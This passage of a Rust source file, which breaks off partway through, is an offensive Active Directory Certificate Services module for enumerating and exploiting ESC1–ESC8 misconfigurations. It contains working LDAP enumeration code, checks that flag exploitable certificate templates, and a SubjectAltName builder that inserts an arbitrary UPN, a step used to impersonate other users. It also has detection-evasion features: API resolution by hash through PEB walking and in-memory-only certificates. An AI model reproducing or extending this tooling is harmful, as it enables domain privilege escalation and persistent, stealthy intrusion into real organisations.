//! Active Directory Certificate Services (AD CS) attack capabilities.
//!
//! Implements enumeration and exploitation of ESC1–ESC8 misconfigurations in
//! enterprise AD CS deployments.  Certificate-based attacks are highly
//! persistent — they survive password resets and are much harder to detect
//! than credential-based attacks.
//!
//! # Attack Reference
//!
//! | ESC | Name                              | Prerequisites                                        |
//! |-----|-----------------------------------|------------------------------------------------------|
//! | 1   | Enrollee supplies subject         | Template has `ENROLLEE_SUPPLIES_SUBJECT` flag + client-auth EKU + low-priv enroll |
//! | 2   | Any purpose / no EKU restriction  | Template has `Any Purpose` EKU or empty EKU list     |
//! | 3   | Certificate request agent         | Template has `Certificate Request Agent` EKU         |
//! | 4   | Template ACL misconfiguration     | Low-priv users have write access to the template     |
//! | 6   | CA `EDITF_ATTRIBUTESUBJECTALTNAME2` | CA allows arbitrary SAN on any template             |
//! | 7   | CA object ACL misconfiguration    | Low-priv users have `ManageCA` or `ManageCertificates` rights |
//! | 8   | NTLM relay via HTTP enrollment    | CA has HTTP (not HTTPS) web enrollment endpoint      |
//!
//! # Module Structure
//! - [`AdcsEnumerator`]: LDAP-based CA and template enumeration.
//! - [`AdcsVulnDetector`]: Static analysis of templates/CAs for ESC patterns.
//! - [`AdcsExploiter`]: Certificate request and exploitation via certreq.exe.
//! - [`CertRequestRpc`]: In-memory CSR generation and CA submission.
//!
//! # OPSEC
//! All Windows API calls are resolved at runtime via PEB walking and export-table
//! hashing (`pe_resolve`).  No static IAT entries are created.  Issued certificates
//! are held in memory only and never written to disk persistently (temp CSR files
//! are deleted immediately after use).

#![cfg(windows)]

use std::ffi::OsStr;
use std::io::{Read, Write};
use std::mem;
use std::net::TcpStream;
use std::os::raw::c_void;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use std::time::UNIX_EPOCH;

use anyhow::{anyhow, bail, Context, Result};
use log::{debug, info, warn};
use serde::{Deserialize, Serialize};

use winapi::shared::guiddef::GUID;
use winapi::shared::minwindef::DWORD;
use winapi::shared::ntdef::{HRESULT, LPCWSTR, LPWSTR};
use winapi::shared::winerror::S_OK;

use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};

// ── Compile-time API hash constants ─────────────────────────────────────────

// wldap32.dll — LDAP client
const WLDAP32_DLL_W: &[u16] = &[
    'w' as u16, 'l' as u16, 'd' as u16, 'a' as u16, 'p' as u16,
    '3' as u16, '2' as u16, '.' as u16, 'd' as u16, 'l' as u16,
    'l' as u16, 0,
];
const HASH_WLDAP32_DLL: u32 = hash_wstr_const(WLDAP32_DLL_W);

const FN_LDAP_INIT: u32 = hash_str_const(b"ldap_initW");
const FN_LDAP_BIND_S: u32 = hash_str_const(b"ldap_bind_sW");
const FN_LDAP_UNBIND: u32 = hash_str_const(b"ldap_unbind");
const FN_LDAP_SEARCH_S: u32 = hash_str_const(b"ldap_search_sW");
const FN_LDAP_FIRST_ENTRY: u32 = hash_str_const(b"ldap_first_entry");
const FN_LDAP_NEXT_ENTRY: u32 = hash_str_const(b"ldap_next_entry");
const FN_LDAP_GET_VALUES: u32 = hash_str_const(b"ldap_get_valuesW");
const FN_LDAP_GET_VALUES_LEN: u32 = hash_str_const(b"ldap_get_values_lenW");
const FN_LDAP_VALUE_FREE: u32 = hash_str_const(b"ldap_value_freeW");
const FN_LDAP_VALUE_FREE_LEN: u32 = hash_str_const(b"ldap_value_free_len");
const FN_LDAP_MSGFREE: u32 = hash_str_const(b"ldap_msgfree");

// netapi32.dll — DC discovery
const NETAPI32_DLL_W: &[u16] = &[
    'n' as u16, 'e' as u16, 't' as u16, 'a' as u16, 'p' as u16,
    'i' as u16, '3' as u16, '2' as u16, '.' as u16, 'd' as u16,
    'l' as u16, 'l' as u16, 0,
];
const HASH_NETAPI32_DLL: u32 = hash_wstr_const(NETAPI32_DLL_W);

const FN_DS_GET_DC_NAME_W: u32 = hash_str_const(b"DsGetDcNameW");
const FN_NET_API_BUFFER_FREE: u32 = hash_str_const(b"NetApiBufferFree");

// ── LDAP type aliases ────────────────────────────────────────────────────────

type PLDAP = *mut c_void;
type PLDAPMSG = *mut c_void;

#[repr(C)]
struct LDAPModW_s {
    mod_op: DWORD,
    mod_type: LPWSTR,
    mod_vals: LDAPModW_Values,
}
type LDAPModW = LDAPModW_s;

#[repr(C)]
union LDAPModW_Values {
    modv_strvals: *mut LPWSTR,
    modv_bvals: *mut *mut LdapBerVal,
}

#[repr(C)]
#[derive(Copy, Clone)]
struct LdapBerVal {
    bv_len: DWORD,
    bv_val: *mut u8,
}

// LDAP constants
const LDAP_SCOPE_BASE: DWORD = 0;
const LDAP_SCOPE_SUBTREE: DWORD = 2;
const LDAP_AUTH_NEGOTIATE: DWORD = 0x0486;
const LDAP_MOD_ADD: DWORD = 0x00;
#[allow(dead_code)]
const LDAP_MOD_REPLACE: DWORD = 0x02;
const LDAP_MOD_BVALUES: DWORD = 0x80;

// ── DC discovery types ───────────────────────────────────────────────────────

#[repr(C)]
struct DomainControllerInfoW {
    domain_controller_name: LPWSTR,
    domain_controller_address: LPWSTR,
    domain_controller_address_type: DWORD,
    domain_guid: GUID,
    domain_name: LPWSTR,
    dns_forest_name: LPWSTR,
    flags: DWORD,
    dc_site_name: LPWSTR,
    client_site_name: LPWSTR,
}

// ── msPKI flag constants ─────────────────────────────────────────────────────

// msPKI-Certificate-Name-Flag
/// Enrollee can supply the subject name in the CSR.
const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT: u32 = 0x00000001;
/// Enrollee can supply a subject alternative name.
const CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME: u32 = 0x00010000;

// msPKI-Enrollment-Flag
/// CA manager must approve the certificate request.
const CT_FLAG_PEND_ALL_REQUESTS: u32 = 0x00000002;

// CA edit flags (EDITF_*)
/// CA allows setting the subjectAltName on any request via request attribute.
const EDITF_ATTRIBUTESUBJECTALTNAME2: u32 = 0x00040000;

// ── EKU OID constants ────────────────────────────────────────────────────────

/// 1.3.6.1.5.5.7.3.2 — Client Authentication
const OID_CLIENT_AUTH: &str = "1.3.6.1.5.5.7.3.2";
/// 1.3.6.1.4.1.311.20.2.2 — Smart Card Logon (Windows)
const OID_SMARTCARD_LOGON: &str = "1.3.6.1.4.1.311.20.2.2";
/// 2.5.29.37.0 — Any Extended Key Usage
const OID_ANY_PURPOSE: &str = "2.5.29.37.0";
/// 1.3.6.1.4.1.311.20.2.1 — Certificate Request Agent (enrollment agent)
const OID_CERT_REQUEST_AGENT: &str = "1.3.6.1.4.1.311.20.2.1";
/// 1.3.6.1.5.2.3.4 — PKINIT Client Authentication (KDC)
const OID_PKINIT_CLIENT_AUTH: &str = "1.3.6.1.5.2.3.4";

// ── Public result types ──────────────────────────────────────────────────────

/// A certificate authority registered in AD CS.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CertificateAuthority {
    /// CA display name (CN).
    pub name: String,
    /// DNS hostname of the CA server.
    pub dns_name: String,
    /// Distinguished name in AD.
    pub distinguished_name: String,
    /// DER-encoded CA certificate.
    pub cert_der: Vec<u8>,
    /// HTTP enrollment URL (`http://<host>/certsrv/`).
    pub ca_url: String,
    /// Template names this CA is configured to issue.
    pub templates: Vec<String>,
    /// CA edit flags read from AD (msPKI-Edit-Flags / flags attribute).
    pub edit_flags: u32,
}

/// A certificate template from the AD CS configuration.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct CertTemplate {
    /// Template name (CN).
    pub name: String,
    /// Display name.
    pub display_name: String,
    /// Distinguished name in AD.
    pub distinguished_name: String,
    /// Template schema version (1 or 2).
    pub schema_version: u32,
    /// `msPKI-Certificate-Name-Flag` — controls subject name supply.
    pub name_flags: u32,
    /// `msPKI-Enrollment-Flag` — controls enrollment behaviour.
    pub enrollment_flags: u32,
    /// `msPKI-RA-Signature` — number of authorized-signature requirements.
    pub ra_signatures: u32,
    /// `pKIExtendedKeyUsage` — list of EKU OID strings.
    pub extended_key_usage: Vec<String>,
    /// `msPKI-Certificate-Application-Policy` — application policy OIDs.
    pub application_policies: Vec<String>,
    /// `msPKI-RA-Application-Policies` — RA application policy OIDs.
    pub ra_application_policies: Vec<String>,
    /// Raw `nTSecurityDescriptor` bytes (for ACL analysis).
    pub security_descriptor: Vec<u8>,
}

impl CertTemplate {
    /// Returns true if the template allows the enrollee to specify the subject.
    pub fn enrollee_supplies_subject(&self) -> bool {
        self.name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT != 0
    }

    /// Returns true if the template allows specifying the subject alternative name.
    pub fn enrollee_supplies_san(&self) -> bool {
        self.name_flags & CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT_ALT_NAME != 0
    }

    /// Returns true if manager approval is required.
    pub fn requires_manager_approval(&self) -> bool {
        self.enrollment_flags & CT_FLAG_PEND_ALL_REQUESTS != 0
    }

    /// Returns true if the template enables Client Authentication.
    pub fn has_client_auth_eku(&self) -> bool {
        self.extended_key_usage.iter().any(|e| {
            e == OID_CLIENT_AUTH
                || e == OID_SMARTCARD_LOGON
                || e == OID_PKINIT_CLIENT_AUTH
        }) || self.application_policies.iter().any(|e| {
            e == OID_CLIENT_AUTH
                || e == OID_SMARTCARD_LOGON
                || e == OID_PKINIT_CLIENT_AUTH
        })
    }

    /// Returns true if the template has the "Any Purpose" EKU or no EKU restriction.
    pub fn has_any_purpose_eku(&self) -> bool {
        self.extended_key_usage.is_empty()
            || self.extended_key_usage.iter().any(|e| e == OID_ANY_PURPOSE)
    }

    /// Returns true if the template has the Certificate Request Agent EKU.
    pub fn has_request_agent_eku(&self) -> bool {
        self.extended_key_usage
            .iter()
            .any(|e| e == OID_CERT_REQUEST_AGENT)
            || self.application_policies
                .iter()
                .any(|e| e == OID_CERT_REQUEST_AGENT)
    }

    /// Returns true if the ESC1/ESC2/ESC3 pre-conditions (aside from ACL) are met.
    pub fn low_priv_enrollment_likely(&self) -> bool {
        // Heuristic: if no RA signatures required and no manager approval,
        // enrollment by low-priv users is plausible.  Full ACL parsing is
        // needed to confirm.
        !self.requires_manager_approval() && self.ra_signatures == 0
    }
}

/// An ESC attack type.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum EscType {
    Esc1,
    Esc2,
    Esc3,
    Esc4,
    Esc6,
    Esc7,
    Esc8,
}

impl std::fmt::Display for EscType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "{:?}", self)
    }
}

/// A template that has been assessed as exploitable for a specific ESC.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerableTemplate {
    /// The vulnerable template.
    pub template: CertTemplate,
    /// Which ESC applies.
    pub esc_type: EscType,
    /// Human-readable description of the vulnerability.
    pub description: String,
    /// Attack prerequisites (what the attacker needs).
    pub prerequisites: String,
    /// Remediation guidance.
    pub remediation: String,
}

/// A CA that has been assessed as exploitable for a specific ESC.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct VulnerableCA {
    /// The vulnerable CA.
    pub ca: CertificateAuthority,
    /// Which ESC applies.
    pub esc_type: EscType,
    /// Human-readable description.
    pub description: String,
    /// Remediation guidance.
    pub remediation: String,
}

/// An in-memory certificate and private key pair (PKCS#12 equivalent).
#[derive(Debug, Clone)]
pub struct Pkcs12 {
    /// DER-encoded issued certificate.
    pub cert_der: Vec<u8>,
    /// DER-encoded PKCS#8 private key.
    pub key_der: Vec<u8>,
    /// Subject of the issued certificate.
    pub subject: String,
    /// UPN embedded in the SAN (if requested).
    pub target_upn: Option<String>,
}

/// A Kerberos TGT obtained via PKINIT.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct KerberosTicket {
    /// Raw AS-REP bytes (krb5 application 11).
    pub as_rep_bytes: Vec<u8>,
    /// Principal name.
    pub principal: String,
    /// Kerberos realm.
    pub realm: String,
}

// ── Enumeration result ───────────────────────────────────────────────────────

/// Full AD CS enumeration output.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct AdcsEnumeration {
    pub certificate_authorities: Vec<CertificateAuthority>,
    pub templates: Vec<CertTemplate>,
    pub vulnerable_templates: Vec<VulnerableTemplate>,
    pub vulnerable_cas: Vec<VulnerableCA>,
    pub esc8_found: Vec<String>,
}

// ── Helper: string conversion ────────────────────────────────────────────────

fn str_to_wide(s: &str) -> Vec<u16> {
    OsStr::new(s)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect()
}

fn wide_to_str(wide: &[u16]) -> Result<String> {
    let len = wide.iter().position(|&c| c == 0).unwrap_or(wide.len());
    String::from_utf16(&wide[..len]).context("Failed to decode wide string")
}

unsafe fn lstrlen_w(s: LPWSTR) -> usize {
    let mut len = 0usize;
    let mut p = s;
    while *p != 0 {
        len += 1;
        p = p.add(1);
    }
    len
}

// ── Helper: minimal DER encoding ────────────────────────────────────────────

fn der_len(len: usize) -> Vec<u8> {
    if len < 128 {
        vec![len as u8]
    } else if len < 256 {
        vec![0x81, len as u8]
    } else {
        vec![0x82, (len >> 8) as u8, (len & 0xff) as u8]
    }
}

fn der_wrap(tag: u8, content: &[u8]) -> Vec<u8> {
    let mut out = vec![tag];
    out.extend_from_slice(&der_len(content.len()));
    out.extend_from_slice(content);
    out
}

fn der_sequence(content: &[u8]) -> Vec<u8> {
    der_wrap(0x30, content)
}

fn der_integer(val: i64) -> Vec<u8> {
    if val == 0 {
        return vec![0x02, 0x01, 0x00];
    }
    let mut bytes = Vec::new();
    let mut v = val.unsigned_abs();
    while v > 0 {
        bytes.push((v & 0xff) as u8);
        v >>= 8;
    }
    bytes.reverse();
    if bytes[0] & 0x80 != 0 {
        bytes.insert(0, 0);
    }
    der_wrap(0x02, &bytes)
}

fn der_general_string(s: &str) -> Vec<u8> {
    der_wrap(0x1b, s.as_bytes())
}

fn der_octet_string(data: &[u8]) -> Vec<u8> {
    der_wrap(0x04, data)
}

fn der_bit_string(data: &[u8]) -> Vec<u8> {
    let mut content = vec![0x00];
    content.extend_from_slice(data);
    der_wrap(0x03, &content)
}

fn der_context_explicit(tag_num: u8, content: &[u8]) -> Vec<u8> {
    der_wrap(0xa0 | tag_num, content)
}

/// Build a SubjectAltName extension value containing a UPN OtherName.
///
/// Encoding: `SEQUENCE { [0] { OID=szOID_NT_PRINCIPAL_NAME, [0] { UTF8String upn } } }`
fn build_san_with_upn(upn: &str) -> Vec<u8> {
    // OID 1.3.6.1.4.1.311.20.2.3 (szOID_NT_PRINCIPAL_NAME) DER-encoded
    let oid_upn: &[u8] = &[
        0x06, 0x0a,
        0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x14, 0x02, 0x03,
    ];

    // UTF8String for the UPN
    let upn_bytes = upn.as_bytes();
    let mut utf8_val = vec![0x0c_u8];
    utf8_val.extend_from_slice(&der_len(upn_bytes.len()));
    utf8_val.extend_from_slice(upn_bytes);

    // [0] EXPLICIT wrapper for OtherName.value
    let mut val_wrapper = vec![0xa0_u8];
    val_wrapper.extend_from_slice(&der_len(utf8_val.len()));
    val_wrapper.extend_from_slice(&utf8_val);

    // OtherName as GeneralName [0] CONSTRUCTED
    let mut othername_content = Vec::new();
    othername_content.extend_from_slice(oid_upn);
    othername_content.extend_from_slice(&val_wrapper);

    let mut generalname = vec![0xa0_u8];
    generalname.extend_from_slice(&der_len(othername_content.len()));
    generalname.extend_from_slice(&othername_content);

    // SubjectAltName ::= SEQUENCE OF GeneralName
    der_sequence(&generalname)
}

/// Format seconds-since-epoch as KerberosTime string (YYYYMMDDHHMMSSZ).
fn format_krb_time(ts: i64) -> String {
    let days = ts / 86400;
    let tod = ts % 86400;
    let h = tod / 3600;
    let m = (tod % 3600) / 60;
    let s = tod % 60;
    let (yr, mo, dy) = epoch_days_to_ymd(days);
    format!("{:04}{:02}{:02}{:02}{:02}{:02}Z", yr, mo, dy, h, m, s)
}

fn epoch_days_to_ymd(mut days: i64) -> (i64, i64, i64) {
    let mut year = 1970_i64;
    loop {
        let yd = if is_leap(year) { 366 } else { 365 };
        if days < yd { break; }
        days -= yd;
        year += 1;
    }
    let leap = is_leap(year);
    let month_lengths = [31_i64, if leap { 29 } else { 28 }, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31];
    let mut month = 1_i64;
    for &ml in &month_lengths {
        if days < ml { break; }
        days -= ml;
        month += 1;
    }
    (year, month, days + 1)
}

fn is_leap(y: i64) -> bool {
    (y % 4 == 0 && y % 100 != 0) || y % 400 == 0
}

// ── DC discovery ─────────────────────────────────────────────────────────────

/// Discover a domain controller via DsGetDcNameW.
fn discover_dc() -> Result<String> {
    let netapi32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_NETAPI32_DLL) }
        .ok_or_else(|| anyhow!("netapi32.dll not found"))?;

    let ds_get_dc_name_w: unsafe fn(
        LPCWSTR, LPCWSTR, *mut GUID, LPCWSTR, DWORD,
        *mut *mut DomainControllerInfoW,
    ) -> HRESULT = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_DS_GET_DC_NAME_W)
                .ok_or_else(|| anyhow!("DsGetDcNameW not found"))?,
        )
    };

    let net_api_buffer_free: unsafe fn(*mut c_void) -> DWORD = unsafe {
        mem::transmute(
            pe_resolve::get_proc_address_by_hash(netapi32, FN_NET_API_BUFFER_FREE)
                .ok_or_else(|| anyhow!("NetApiBufferFree not found"))?,
        )
    };

    let mut dc_info: *mut DomainControllerInfoW = ptr::null_mut();
    let hr = unsafe {
        ds_get_dc_name_w(
            ptr::null(), ptr::null(), ptr::null_mut(), ptr::null(), 0, &mut dc_info,
        )
    };

    if hr != S_OK as HRESULT || dc_info.is_null() {
        bail!("DsGetDcNameW failed: hr=0x{:08X}", hr as u32);
    }

    let dc_name = unsafe {
        let p = (*dc_info).domain_controller_name;
        if p.is_null() {
            net_api_buffer_free(dc_info as *mut c_void);
            bail!("DC name pointer is null");
        }
        let name = wide_to_str(&std::slice::from_raw_parts(p, lstrlen_w(p) + 1))?;
        net_api_buffer_free(dc_info as *mut c_void);
        name
    };

    let dc_hostname = dc_name.trim_start_matches('\\').to_string();
    info!("[ADCS] Discovered DC: {}", dc_hostname);
    Ok(dc_hostname)
}

// ── LDAP connection wrapper ──────────────────────────────────────────────────

struct LdapConn {
    ld: PLDAP,
}

impl LdapConn {
    fn connect(dc: &str) -> Result<Self> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_init_w: unsafe fn(LPWSTR, DWORD, DWORD) -> PLDAP = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_INIT)
                    .ok_or_else(|| anyhow!("ldap_initW not found"))?,
            )
        };
        let ldap_bind_s_w: unsafe fn(PLDAP, LPWSTR, *mut c_void, DWORD) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_BIND_S)
                    .ok_or_else(|| anyhow!("ldap_bind_sW not found"))?,
            )
        };

        let host_w = str_to_wide(dc);
        let ld = unsafe { ldap_init_w(host_w.as_ptr() as LPWSTR, 389, 0) };
        if ld.is_null() {
            bail!("ldap_initW failed for {}", dc);
        }

        let res = unsafe {
            ldap_bind_s_w(ld, ptr::null_mut(), ptr::null_mut(), LDAP_AUTH_NEGOTIATE)
        };
        if res != 0 {
            bail!("ldap_bind_sW failed: error 0x{:08X}", res);
        }

        debug!("[ADCS] Connected to LDAP on {}", dc);
        Ok(Self { ld })
    }

    /// Get the `defaultNamingContext` from the Root DSE.
    fn default_naming_context(&self) -> Result<String> {
        self.search_single_string(
            "",
            LDAP_SCOPE_BASE,
            "(objectClass=*)",
            "defaultNamingContext",
        )
    }

    /// Get the configuration naming context from the Root DSE.
    fn config_naming_context(&self) -> Result<String> {
        self.search_single_string(
            "",
            LDAP_SCOPE_BASE,
            "(objectClass=*)",
            "configurationNamingContext",
        )
    }

    /// Search and return the first value of a single-valued string attribute.
    fn search_single_string(
        &self,
        base_dn: &str,
        scope: DWORD,
        filter: &str,
        attribute: &str,
    ) -> Result<String> {
        let results = self.search_string_attr(base_dn, scope, filter, attribute)?;
        results
            .into_iter()
            .next()
            .ok_or_else(|| anyhow!("Attribute '{}' not found for filter '{}'", attribute, filter))
    }

    /// Search for all values of a string attribute, returning Vec<String>.
    fn search_string_attr(
        &self,
        base_dn: &str,
        scope: DWORD,
        filter: &str,
        attribute: &str,
    ) -> Result<Vec<String>> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };
        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };
        let ldap_get_values_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };
        let ldap_value_free_w: unsafe fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };
        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        let base_w = str_to_wide(base_dn);
        let filter_w = str_to_wide(filter);
        let attr_w = str_to_wide(attribute);
        let mut attrs: Vec<LPWSTR> = vec![attr_w.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                base_w.as_ptr() as LPWSTR,
                scope,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            return Ok(Vec::new());
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            return Ok(Vec::new());
        }

        let attr_w2 = str_to_wide(attribute);
        let values = unsafe { ldap_get_values_w(self.ld, entry, attr_w2.as_ptr() as LPWSTR) };
        if values.is_null() {
            unsafe { ldap_msgfree(result) };
            return Ok(Vec::new());
        }

        let mut out = Vec::new();
        unsafe {
            let mut i = 0;
            loop {
                let vp = *values.add(i);
                if vp.is_null() {
                    break;
                }
                let len = lstrlen_w(vp);
                if let Ok(s) = wide_to_str(&std::slice::from_raw_parts(vp, len + 1)) {
                    out.push(s);
                }
                i += 1;
            }
            ldap_value_free_w(values);
            ldap_msgfree(result);
        }

        Ok(out)
    }

    /// Read a single binary attribute from a known DN (LDAP_SCOPE_BASE).
    fn read_binary_attr(&self, dn: &str, attribute: &str) -> Result<Vec<u8>> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };
        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };
        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal =
            unsafe {
                mem::transmute(
                    pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
                        .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
                )
            };
        let ldap_value_free_len: unsafe fn(*mut *mut LdapBerVal) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE_LEN)
                    .ok_or_else(|| anyhow!("ldap_value_free_len not found"))?,
            )
        };
        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        let dn_w = str_to_wide(dn);
        let filter_w = str_to_wide("(objectClass=*)");
        let attr_w = str_to_wide(attribute);
        let mut attrs: Vec<LPWSTR> = vec![attr_w.as_ptr() as LPWSTR, ptr::null_mut()];
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
                dn_w.as_ptr() as LPWSTR,
                LDAP_SCOPE_BASE,
                filter_w.as_ptr() as LPWSTR,
                attrs.as_mut_ptr(),
                0,
                &mut result,
            )
        };

        if res != 0 {
            return Ok(Vec::new());
        }

        let entry = unsafe { ldap_first_entry(self.ld, result) };
        if entry.is_null() {
            unsafe { ldap_msgfree(result) };
            return Ok(Vec::new());
        }

        let attr_w2 = str_to_wide(attribute);
        let bvals = unsafe { ldap_get_values_len_w(self.ld, entry, attr_w2.as_ptr() as LPWSTR) };
        if bvals.is_null() {
            unsafe { ldap_msgfree(result) };
            return Ok(Vec::new());
        }

        let data = unsafe {
            let bv_ptr = *bvals;
            let bytes = if !bv_ptr.is_null() {
                let bv = *bv_ptr;
                std::slice::from_raw_parts(bv.bv_val, bv.bv_len as usize).to_vec()
            } else {
                Vec::new()
            };
            ldap_value_free_len(bvals);
            ldap_msgfree(result);
            bytes
        };

        Ok(data)
    }

    /// Enumerate all children under a base DN with a filter, returning a list
    /// of (DN, Vec<(attribute, Vec<value>)>) tuples.
    fn search_all(
        &self,
        base_dn: &str,
        filter: &str,
        attributes: &[&str],
    ) -> Result<Vec<LdapEntry>> {
        let wldap32 = unsafe { pe_resolve::get_module_handle_by_hash(HASH_WLDAP32_DLL) }
            .ok_or_else(|| anyhow!("wldap32.dll not found"))?;

        let ldap_search_s_w: unsafe fn(
            PLDAP, LPWSTR, DWORD, LPWSTR, *mut LPWSTR, DWORD, *mut PLDAPMSG,
        ) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_SEARCH_S)
                    .ok_or_else(|| anyhow!("ldap_search_sW not found"))?,
            )
        };
        let ldap_first_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_FIRST_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_first_entry not found"))?,
            )
        };
        let ldap_next_entry: unsafe fn(PLDAP, PLDAPMSG) -> PLDAPMSG = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_NEXT_ENTRY)
                    .ok_or_else(|| anyhow!("ldap_next_entry not found"))?,
            )
        };
        let ldap_get_values_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut LPWSTR = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES)
                    .ok_or_else(|| anyhow!("ldap_get_valuesW not found"))?,
            )
        };
        let ldap_value_free_w: unsafe fn(*mut LPWSTR) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE)
                    .ok_or_else(|| anyhow!("ldap_value_freeW not found"))?,
            )
        };
        let ldap_get_values_len_w: unsafe fn(PLDAP, PLDAPMSG, LPWSTR) -> *mut *mut LdapBerVal =
            unsafe {
                mem::transmute(
                    pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_GET_VALUES_LEN)
                        .ok_or_else(|| anyhow!("ldap_get_values_lenW not found"))?,
                )
            };
        let ldap_value_free_len: unsafe fn(*mut *mut LdapBerVal) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_VALUE_FREE_LEN)
                    .ok_or_else(|| anyhow!("ldap_value_free_len not found"))?,
            )
        };
        let ldap_msgfree: unsafe fn(PLDAPMSG) -> DWORD = unsafe {
            mem::transmute(
                pe_resolve::get_proc_address_by_hash(wldap32, FN_LDAP_MSGFREE)
                    .ok_or_else(|| anyhow!("ldap_msgfree not found"))?,
            )
        };

        // Build attribute list
        let mut attr_wide: Vec<Vec<u16>> = attributes
            .iter()
            .map(|a| str_to_wide(a))
            .collect();
        // Include distinguishedName always
        attr_wide.push(str_to_wide("distinguishedName"));
        let mut attr_ptrs: Vec<LPWSTR> = attr_wide
            .iter()
            .map(|v| v.as_ptr() as LPWSTR)
            .collect();
        attr_ptrs.push(ptr::null_mut());

        let base_w = str_to_wide(base_dn);
        let filter_w = str_to_wide(filter);
        let mut result: PLDAPMSG = ptr::null_mut();

        let res = unsafe {
            ldap_search_s_w(
                self.ld,
